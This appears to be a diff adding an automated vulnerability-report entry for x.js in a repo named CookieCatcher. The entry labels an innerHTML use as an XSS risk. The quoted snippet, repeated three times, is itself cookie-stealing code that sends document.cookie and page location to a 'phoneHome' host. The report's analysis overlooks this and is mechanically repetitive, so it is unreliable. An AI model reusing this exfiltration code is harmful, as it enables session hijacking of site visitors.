@@ -1,0 +1,44 @@
+2. Repo: DisK0nn3cT/CookieCatcher
+	File: x.js
+	URL: https://github.com/DisK0nn3cT/CookieCatcher/blob/94ebb9e4c127a56a5ab587637a8ddbcab814dfea/x.js
+	Vulnerable Pattern: innerHTML
+	Attack Description: innerHTML allows direct injection of untrusted input into the DOM, enabling attackers to insert malicious scripts.
+	Vulnerable Code Snippet:
+  } else  { // code for IE6, IE5
+    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+  xmlhttp.onreadystatechange=function() {
+    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
+      document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
+    }
+  }
+  xmlhttp.open("GET",phoneHome+"x.php?c="+document.cookie+"&d="+document.domain+document.location.pathname,true);
+  xmlhttp.send();
+}
+Step-by-Step Attack Scenario:
+			1. The vulnerable code is found in the following file:
+  } else  { // code for IE6, IE5
+    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+  xmlhttp.onreadystatechange=function() {
+    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
+      document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
+    }
+  }
+  xmlhttp.open("GET",phoneHome+"x.php?c="+document.cookie+"&d="+document.domain+document.location.pathname,true);
+  xmlhttp.send();
+}
+			2. An attacker could inject a malicious script where the `innerHTML` pattern is used, exploiting this specific function in the code.
+			3. For instance, an attacker might craft a payload like `<script>alert('XSS')</script>`, which would get injected here:
+  } else  { // code for IE6, IE5
+    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+  xmlhttp.onreadystatechange=function() {
+    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
+      document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
+    }
+  }
+  xmlhttp.open("GET",phoneHome+"x.php?c="+document.cookie+"&d="+document.domain+document.location.pathname,true);
+  xmlhttp.send();
+}
+			4. When the browser renders this code, the malicious script executes, leading to an XSS attack.
